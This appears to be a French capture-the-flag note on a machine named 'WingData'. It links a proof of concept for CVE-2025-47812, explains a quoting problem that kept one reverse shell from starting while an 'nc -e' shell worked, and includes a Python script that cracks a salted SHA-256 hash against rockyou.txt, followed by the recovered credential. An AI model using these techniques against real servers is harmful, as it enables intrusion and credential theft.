---
aliases:
  - WingData
---
![[IMG-20260214235118941.png]]

![[IMG-20260214235520349.png]]

![[IMG-20260215000647247.png]]

 #### [CVE-2025-47812](https://github.com/4m3rr0r/CVE-2025-47812-poc)

![[IMG-20260215001439199.png]]
La première commande ne fonctionne pas car le PoC encapsule déjà automatiquement le payload entre quotes simples ('...').  
En ajoutant nous-mêmes des quotes (sh -c '...'), on casse la chaîne envoyée au serveur, donc la commande est mal interprétée et le reverse shell ne se lance pas (session expired).

La commande avec nc -e fonctionne car elle ne contient pas de quotes imbriquées et est exécutée correctement.

![[IMG-20260215001500951.png]]

![[IMG-20260215004235214.png]]

![[IMG-20260215004253856.png]]

```
Salt:WingFTP
Hash:32940defd3c3ef70a2dd44a5301ff984c4742f0baae76ff5b8783994f8a503ca
```

crack.py:
```python
import hashlib  
  
target = "32940defd3c3ef70a2dd44a5301ff984c4742f0baae76ff5b8783994f8a503ca"  
salt = "WingFTP"  
  
def sha256(s):  
return hashlib.sha256(s.encode()).hexdigest()  
  
with open("/opt/lists/rockyou.txt", "rb") as f:  
for line in f:  
pw = line.strip().decode(errors="ignore")  
  
if sha256(pw + salt) == target:  
print("[+] FOUND:", pw, "(pw+salt)")  
break  
  
if sha256(salt + pw) == target:  
print("[+] FOUND:", pw, "(salt+pw)")  
break
```

![[IMG-20260215004423130.png]]

```
wacky:!#7Blushing^*Bride5
```

![[IMG-20260215004507026.png]]

